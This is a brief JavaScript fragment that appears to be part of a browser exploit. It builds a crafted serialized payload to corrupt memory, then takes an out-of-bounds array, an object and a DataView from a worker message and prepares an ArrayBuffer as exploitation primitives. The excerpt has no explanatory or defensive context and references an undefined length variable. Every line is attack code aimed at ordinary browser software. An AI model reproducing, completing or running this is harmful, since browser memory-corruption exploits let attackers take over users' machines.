		var arrElement = "-".repeat(19) + "U\x30" + "-".repeat(7);		
		var str = '"\x06length^\x00U\x02A\x01y$\x00\x01@\x03\x03' + arrElement + '$\x00' + String.fromCharCode(arrLen);
var oobArray = e.data;
if (oobArray[0] === undefined)
   return;
var oobObject = oobArray[0];
var dv = oobArray[1];
var ab = new ArrayBuffer(0x1000);
ab[0] = {};
